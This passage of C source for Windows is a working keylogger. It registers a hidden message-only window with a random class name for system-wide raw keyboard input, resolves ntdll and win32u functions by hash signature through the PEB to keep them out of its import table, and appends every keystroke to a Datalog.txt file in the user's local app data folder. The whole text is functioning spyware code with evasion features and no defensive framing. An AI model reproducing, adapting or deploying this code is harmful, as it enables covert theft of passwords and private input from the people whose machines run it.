	LARGE_INTEGER Integer; RtlZeroMemoryInternal(&Integer, sizeof(LARGE_INTEGER)); Integer.QuadPart = 2048;

	UNICODE_STRING uString; RtlZeroMemoryInternal(&uString, sizeof(UNICODE_STRING));
	UNICODE_STRING BinaryNtPath; RtlZeroMemoryInternal(&BinaryNtPath, sizeof(UNICODE_STRING));

	NTSTATUS Status = ERROR_SUCCESS;
	HANDLE hHandle = NULL;

	RtlInitUnicodeString(&uString, lpFileName);

	if (uString.Buffer[0] != L'\\')
		Api.RtlDosPathNameToNtPathName_U(uString.Buffer, &BinaryNtPath, NULL, NULL);

	InitializeObjectAttributes(&Attributes, &BinaryNtPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

	Status = Api.NtCreateFile(&hHandle, FILE_GENERIC_WRITE | FILE_GENERIC_READ, &Attributes, &Io, &Integer, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN_IF, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, 0, 0);
	if (!NT_SUCCESS(Status))
		return NULL;

	return hHandle;
}

BOOL InlineRtlNtUserGetMessage(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax)
{
	BOOL Result;

	if ((wMsgFilterMin | wMsgFilterMax) & ~WM_MAXIMUM)
		return FALSE;

	Result = Api.NtUserGetMessage(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax);
	if (-1 == (INT)Result)
		return Result;

	return Result;
}

BOOL InlineRtlNtUserTranslateMessage(PMSG lpMsg, UINT Flags)
{
	switch (lpMsg->message)
	{
		case WM_KEYDOWN:
		case WM_KEYUP:
		case WM_SYSKEYDOWN:
		case WM_SYSKEYUP:
		{
			return(Api.NtUserTranslateMessage((LPMSG)lpMsg, Flags));
		}
		default:
		{
			if (lpMsg->message & ~WM_MAXIMUM)
				return FALSE;
		}
	}

	return FALSE;
}

UINT RtlQueryRawInputSize(HRAWINPUT Input)
{
	UINT ReturnSize = 0;
	if(Api.NtUserGetRawInputData(Input, RID_INPUT, NULL, &ReturnSize, sizeof(RAWINPUTHEADER)) == (UINT)-1)
		return 0;
	else
		return ReturnSize;
}

BOOL InlineRtlNtWriteFile(HANDLE File, LPVOID Buffer)
{
	NTSTATUS Status = ERROR_SUCCESS;
	IO_STATUS_BLOCK Block; RtlZeroMemoryInternal(&Block, sizeof(IO_STATUS_BLOCK));

	Status = Api.NtWriteFile(File, NULL, NULL, NULL, &Block, Buffer, (ULONG)StringLengthW((PWCHAR)Buffer), NULL, NULL);
	if (!NT_SUCCESS(Status))
		return FALSE;

	return TRUE;
}

BOOL RtlFlushInMemoryInputBufferToDisk(HANDLE hHandle, UINT Key)
{
	BYTE lpKeyState[256] = { 0 };
	WORD VirtualKey = 0;
	DWORD dwBufferLength = 0;
	WCHAR wWriteBuffer[64]; RtlZeroMemoryInternal(wWriteBuffer, sizeof(wWriteBuffer));
	WCHAR AltKeyNameBuffer[64]; RtlZeroMemoryInternal(AltKeyNameBuffer, sizeof(AltKeyNameBuffer));
	DWORD dwWritten = 0;
	WCHAR pwszBuff[10] = { 0 };

	if (!Api.NtUserGetKeyboardState(lpKeyState))
		return FALSE;

	switch (Key)
	{
		case VK_BACK:
		{
			if (StringConcatW(wWriteBuffer, (PWCHAR)L"[BS]") != NULL)
				dwBufferLength = (DWORD)StringLengthW(wWriteBuffer);

			break;
		}
		case VK_RETURN:
		{
			if(StringCopyW(wWriteBuffer, (PWCHAR)L"\r\n") != NULL)
				dwBufferLength = (DWORD)StringLengthW(wWriteBuffer);
			
			break;
		}
		default:
		{
			if (Api.NtUserToUnicodeEx(Key, Api.NtUserMapVirtualKeyEx(Key, 0, 0, 0), lpKeyState, pwszBuff, 2, 0, 0) >= 1)
			{
				StringConcatW(wWriteBuffer, pwszBuff);
				dwBufferLength = (DWORD)StringLengthW(wWriteBuffer);
			}
			else if (Api.NtUserGetKeyNameText(MAKELONG(0, Api.NtUserMapVirtualKeyEx(Key, 0, 0, 0)), AltKeyNameBuffer, 64) > 0)
			{
				StringConcatW(wWriteBuffer, (PWCHAR)L"["); StringConcatW(wWriteBuffer, AltKeyNameBuffer); StringConcatW(wWriteBuffer, (PWCHAR)L"]");
				dwBufferLength = (DWORD)StringLengthW(wWriteBuffer);
			}
				
			break;
		}
	}

	if (dwBufferLength > 0)
		InlineRtlNtWriteFile(hHandle, wWriteBuffer);

	return TRUE;
}

LRESULT CALLBACK Wndproc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
	static HANDLE hHandle;
	RAWINPUTDEVICE RawInputDevice;
	PRAWINPUT Input = 0;
	UINT uSize;

	switch (Msg)
	{
		case WM_CREATE:
		{
			WCHAR LocalAppDataPath[512] = { 0 };

			RawInputDevice.usUsagePage = HID_USAGE_PAGE_GENERIC;
			RawInputDevice.usUsage = HID_USAGE_GENERIC_KEYBOARD;
			RawInputDevice.dwFlags = RIDEV_INPUTSINK;
			RawInputDevice.hwndTarget = hWnd;

			if (!Api.NtUserRegisterRawInputDevices(&RawInputDevice, 1, sizeof(RAWINPUTDEVICE)))
				InlineWin32uPostQuitMessage(InlineTebGetLastError());

			if(InlineUppGetEnvironmentVariableW(L"LOCALAPPDATA", LocalAppDataPath, 512) == 0)
				InlineWin32uPostQuitMessage(InlineTebGetLastError());

			StringConcatW(LocalAppDataPath, (PWCHAR)L"\\Datalog.txt");

			hHandle = InlineNtdllNtCreateFile(LocalAppDataPath);
			if (hHandle != NULL)
			{
				if (InlineRtlSetFilePointerToEnd(hHandle) == INVALID_SET_FILE_POINTER)
					InlineWin32uPostQuitMessage(InlineTebGetLastError());
			}
			else
				InlineWin32uPostQuitMessage(InlineTebGetLastError());
		
			break;
		}

		case WM_INPUT:
		{
			uSize = RtlQueryRawInputSize((HRAWINPUT)lParam);
			if(uSize == 0)
				InlineWin32uPostQuitMessage(InlineTebGetLastError());

			Input = (PRAWINPUT)Api.RtlAllocateHeap(Api.Peb->ProcessHeap, HEAP_ZERO_MEMORY, uSize);
			if(Input == NULL)
				InlineWin32uPostQuitMessage(InlineTebGetLastError());

			if (Api.NtUserGetRawInputData((HRAWINPUT)lParam, RID_INPUT, Input, &uSize, sizeof(RAWINPUTHEADER)) == (UINT)-1)
				break;

#pragma warning( push )
#pragma warning( disable : 6011)
			if(Input->header.dwType == RIM_TYPEKEYBOARD && Input->data.keyboard.Message == WM_KEYDOWN)
				RtlFlushInMemoryInputBufferToDisk(hHandle, Input->data.keyboard.VKey);
#pragma warning( pop ) 

			Api.RtlFreeHeap(Api.Peb->ProcessHeap, HEAP_ZERO_MEMORY, Input);
		
			break;
		}

		case WM_DESTROY:
		{
			if (hHandle)
				Api.NtClose(hHandle);

			break;
		}

		default:
		{
			return Api.NtdllDefWindowProc_W(hWnd, Msg, wParam, lParam);
		}
	}

	return ERROR_SUCCESS;
}

ULONG Next = 2;

INT PseudoInlineRandomSubroutine(PULONG Context)
{
	return ((*Context = *Context * 1103515245 + 12345) % ((ULONG)RAND_MAX + 1));
}

INT PseudoInlineRandom(VOID)
{
	return (PseudoInlineRandomSubroutine(&Next));
}

PWCHAR RtlGeneratePseudoRandomString(SIZE_T dwLength)
{
	WCHAR DataSet[] = L"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	PWCHAR String = NULL;

	String = (PWCHAR)Api.RtlAllocateHeap(Api.Peb->ProcessHeap, HEAP_ZERO_MEMORY, (sizeof(WCHAR) * (dwLength + 1)));
	if (String == NULL)
		return NULL;

	for (INT dwN = 0; dwN < dwLength; dwN++)
	{
		INT Key = PseudoInlineRandom() % (INT)(StringLengthW(DataSet) - 1);
		String[dwN] = DataSet[Key];
	}

#pragma warning (push)
#pragma warning (disable: 6386)
	String[dwLength] = '\0';
#pragma warning (pop)
	
	return String;
} 

BOOL LdrLoadNtDllFunctionality(VOID)
{
	Api.LdrLoadDll = (LDRLOADDLL)ImportFunction(Api.PeBase, LDRLOADDLL_SIG);
	Api.RtlAllocateHeap = (RTLALLOCATEHEAP)ImportFunction(Api.PeBase, RTLALLOCATEHEAP_SIG);
	Api.RtlFreeHeap = (RTLFREEHEAP)ImportFunction(Api.PeBase, RTLFREEHEAP_SIG);
	Api.NtClose = (NTCLOSE)ImportFunction(Api.PeBase, NTCLOSE_SIG);
	Api.RtlDosPathNameToNtPathName_U = (RTLDOSPATHNAMETONTPATHNAME_U)ImportFunction(Api.PeBase, RTLDOSPATHNAMETONTPATHNAME_U_SIG);
	Api.NtCreateFile = (NTCREATEFILE)ImportFunction(Api.PeBase, NTCREATEFILE_SIG);
	Api.NtdllDefWindowProc_W = (NTDLLDEFWINDOWPROC_W)ImportFunction(Api.PeBase, NTDLLDEFWINDOWPROC_W_SIG);
	Api.NtQueryInformationFile = (NTQUERYINFORMATIONFILE)ImportFunction(Api.PeBase, NTQUERYINFORMATIONFILE_SIG);
	Api.NtSetInformationFile = (NTSETINFORMATIONFILE)ImportFunction(Api.PeBase, NTSETINFORMATIONFILE_SIG);
	Api.NtWriteFile = (NTWRITEFILE)ImportFunction(Api.PeBase, NTWRITEFILE_SIG);

	if (!Api.LdrLoadDll || !Api.RtlAllocateHeap || !Api.RtlFreeHeap || !Api.NtClose)
		return FALSE;

	if (!Api.RtlDosPathNameToNtPathName_U || !Api.NtCreateFile || !Api.NtdllDefWindowProc_W)
		return FALSE;

	if (!Api.NtQueryInformationFile || !Api.NtSetInformationFile || !Api.NtWriteFile)
		return FALSE;

	return TRUE;
}

BOOL RtlGetWin32uImageBase(VOID)
{
	NTSTATUS Status = 0;
	UNICODE_STRING Win32u; RtlInitUnicodeString(&Win32u, (PWCHAR)L"Win32u.dll");

	Status = Api.LdrLoadDll(NULL, 0, &Win32u, (PHANDLE)&Api.Win32uBase);
	if (!NT_SUCCESS(Status))
		return FALSE;

	return TRUE;
}

BOOL LdrLoadWin32uFunctionality(VOID)
{
	if (!RtlGetWin32uImageBase())
		return FALSE;
	
	Api.NtUserCallOneParam = (NTUSERCALLONEPARAM)ImportFunction(Api.Win32uBase, NTUSERCALLONEPARAM_SIG);
	Api.NtUserDestroyWindow = (NTUSERDESTROYWINDOW)ImportFunction(Api.Win32uBase, NTUSERDESTROYWINDOW_SIG);
	Api.NtUserRegisterRawInputDevices = (NTUSERREGISTERRAWINPUTDEVICES)ImportFunction(Api.Win32uBase, NTUSERREGISTERRAWINPUTDEVICES_SIG);
	Api.NtUserGetRawInputData = (NTUSERGETRAWINPUTDATA)ImportFunction(Api.Win32uBase, NTUSERGETRAWINPUTDATA_SIG);
	Api.NtUserGetKeyboardState = (NTUSERGETKEYBOARDSTATE)ImportFunction(Api.Win32uBase, NTUSERGETKEYBOARDSTATE_SIG);
	Api.NtUserToUnicodeEx = (NTUSERTOUNICODEEX)ImportFunction(Api.Win32uBase, NTUSERTOUNICODEEX_SIG);
	Api.NtUserMapVirtualKeyEx = (NTUSERMAPVIRTUALKEYEX)ImportFunction(Api.Win32uBase, NTUSERMAPVIRTUALKEYEX_SIG);
	Api.NtUserGetKeyNameText = (NTUSERGETKEYNAMETEXT)ImportFunction(Api.Win32uBase, NTUSERGETKEYNAMETEXT_SIG);
	Api.NtUserGetMessage = (NTUSERGETMESSAGE)ImportFunction(Api.Win32uBase, NTUSERGETMESSAGE_SIG);
	Api.NtUserTranslateMessage = (NTUSERTRANSLATEMESSAGE)ImportFunction(Api.Win32uBase, NTUSERTRANSLATEMESSAGE_SIG);

	if (!Api.NtUserCallOneParam || !Api.NtUserDestroyWindow || !Api.NtUserRegisterRawInputDevices || !Api.NtUserGetRawInputData)
		return FALSE;

	if (!Api.NtUserGetKeyboardState || !Api.NtUserToUnicodeEx || !Api.NtUserMapVirtualKeyEx || !Api.NtUserGetKeyNameText)
		return FALSE;

	if (!Api.NtUserGetMessage || !Api.NtUserTranslateMessage)
		return FALSE;
	
	return TRUE;
}

INT WINAPI wWinMain(_In_ HINSTANCE hInstance, 
					_In_opt_ HINSTANCE hPrevInstance, 
					_In_ LPWSTR lpCmdLine, 
					_In_ INT nShowCmd)
{
	HWND WindowHandle = NULL;
	MSG Msg;
	Api.Teb = (PTEB)GetTeb(); Api.Peb = (PPEB)Api.Teb->ProcessEnvironmentBlock;
	PLDR_MODULE LoaderModule = NULL;

	if (Api.Peb->OSMajorVersion != 0x0a)
		return ERROR_CALL_NOT_IMPLEMENTED;

	LoaderModule = (PLDR_MODULE)((PBYTE)Api.Peb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 16);
	Api.PeBase = (DWORD64)LoaderModule->BaseAddress;

	if(!LdrLoadNtDllFunctionality())
		return ERROR_INVALID_FUNCTION;

	if(!LdrLoadWin32uFunctionality())
		return ERROR_INVALID_FUNCTION;

	Api.lpszClassNameBuffer = (PWCHAR)RtlGeneratePseudoRandomString(10);

	WNDCLASSEXW WndClass; RtlZeroMemoryInternal(&WndClass, sizeof(WndClass));
	WndClass.cbSize = sizeof(WNDCLASSEXW);
	WndClass.lpfnWndProc = Wndproc;
	WndClass.hInstance = hInstance;
	WndClass.lpszClassName = Api.lpszClassNameBuffer;

	if (!RegisterClassExW(&WndClass))
		return InlineTebGetLastError();

	WindowHandle = CreateWindowExW(0, Api.lpszClassNameBuffer, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, hInstance, NULL);
	if (WindowHandle == NULL)
		return InlineTebGetLastError();

	while (InlineRtlNtUserGetMessage(&Msg, NULL, 0, 0) > 0)
	{
		InlineRtlNtUserTranslateMessage(&Msg, 0);
		DispatchMessageW(&Msg);
	}

	Api.NtUserDestroyWindow(WindowHandle);
	Api.RtlFreeHeap(Api.Peb->ProcessHeap, HEAP_ZERO_MEMORY, Api.lpszClassNameBuffer);

	return ERROR_SUCCESS;
}